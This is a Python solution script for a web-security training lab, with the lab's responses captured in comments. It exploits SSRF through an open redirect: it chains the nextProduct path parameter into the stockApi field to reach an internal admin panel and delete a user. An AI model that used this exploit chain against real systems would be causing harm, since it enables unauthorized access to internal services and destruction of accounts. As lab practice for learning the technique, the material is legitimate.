# Lab: SSRF with filter bypass via open redirection vulnerability

import requests

base = "https://0a2700dc04df454881782fb30074008b.web-security-academy.net"
s=requests.Session()

print("===========[step1] Access to admin page===============")
page_admin=s.get(f"{base}/admin")
print(page_admin.text)

'''
Not Found
'''

print("===========[step2] Access Product Page===============")
page_product=s.get(f"{base}/product", params={"productId":"5"})
print(page_product.text)

'''
                        <form id="stockCheckForm" action="/product/stock" method="POST">
                            <select name="stockApi">
                                <option value="/product/stock/check?productId=5&storeId=1">London</option>
                                <option value="/product/stock/check?productId=5&storeId=2">Paris</option>
                                <option value="/product/stock/check?productId=5&storeId=3">Milan</option>
                            </select>
                            <button type="submit" class="button">Check stock</button>
                        </form>
                        <span id="stockCheckResult"></span>
                        <script src="/resources/js/stockCheckPayload.js"></script>
                        <script src="/resources/js/stockCheck.js"></script>
                        <div class="is-linkback">
                            <a href="/">Return to list</a>
                            <a href="/product/nextProduct?currentProductId=5&path=/product?productId=6">| Next product</a>
                        </div>
'''

print("===========[step3] Check stock===============")
page_stock = s.post(f"{base}/product/stock",
                    data={"stockApi": "/product/stock/check?productId=5&storeId=1"})
print(page_stock.request.body)  # To Check request's encoding issue
print(page_stock.status_code)
print(page_stock.text)
'''
stockApi=%2Fproduct%2Fstock%2Fcheck%3FproductId%3D5%26storeId%3D1
200
871
'''

print("===========[step3-1] Check stock===============")
page_next = s.get(f"{base}/product/nextProduct",
                    params={"currentProductId": "1", "path":"/product?productId=2"})
print(page_next.request.body)  # To Check request's encoding issue
print(page_next.status_code)
print(page_next.text)
'''
                        <form id="stockCheckForm" action="/product/stock" method="POST">
                            <select name="stockApi">
                                <option value="/product/stock/check?productId=2&storeId=1">London</option>
                                <option value="/product/stock/check?productId=2&storeId=2">Paris</option>
                                <option value="/product/stock/check?productId=2&storeId=3">Milan</option>
                            </select>
                            <button type="submit" class="button">Check stock</button>
                        </form>
                        <span id="stockCheckResult"></span>
                        <script src="/resources/js/stockCheckPayload.js"></script>
                        <script src="/resources/js/stockCheck.js"></script>
                        <div class="is-linkback">
                            <a href="/">Return to list</a>
                            <a href="/product/nextProduct?currentProductId=2&path=/product?productId=3">| Next product</a>
                        </div>
                    </section>
'''
print("===========[step3-2] Check stock===============")
page_next = s.get(f"{base}/product/nextProduct",
                    params={"path":"/product?productId=2"})
print(page_next.request.body)  # To Check request's encoding issue
print(page_next.status_code)
print(page_next.text)


print("===========[step3-3] Check stock===============")
page_next = s.get(f"{base}/product/nextProduct",
                    params={"path":"http://192.168.0.12:8080/admin"}, allow_redirects=False, timeout=10)
print(page_next.request.body)  # To Check request's encoding issue
print(page_next.status_code)
print(page_next.text)
print(page_next.headers.get("Location")) 
'''
[!] Found OpenRedirect URL!!
None
302

http://192.168.0.12:8080/admin
'''

print("===========[step4] Access loop Admin Page with stockapi===============")
page = s.post(f"{base}/product/stock",
              data={"stockApi": "/product/nextProduct?path=http://192.168.0.12:8080/admin"},
              allow_redirects=False, timeout=10)
print(page.request.body)
print(page.status_code)
print(page.text)
'''
                    <section>
                        <h1>Users</h1>
                        <div>
                            <span>wiener - </span>
                            <a href="/http://192.168.0.12:8080/admin/delete?username=wiener">Delete</a>
                        </div>
                        <div>
                            <span>carlos - </span>
                            <a href="/http://192.168.0.12:8080/admin/delete?username=carlos">Delete</a>
                        </div>
                    </section>
'''

print("===========[step5] Delete Carlos===============")
page = s.post(f"{base}/product/stock",
              data={"stockApi": "/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos"},
              allow_redirects=False, timeout=10)
print(page.request.body)
print(page.status_code)
print(page.text)

'''
None
302

/http://192.168.0.12:8080/admin/delete?username=carlos
'''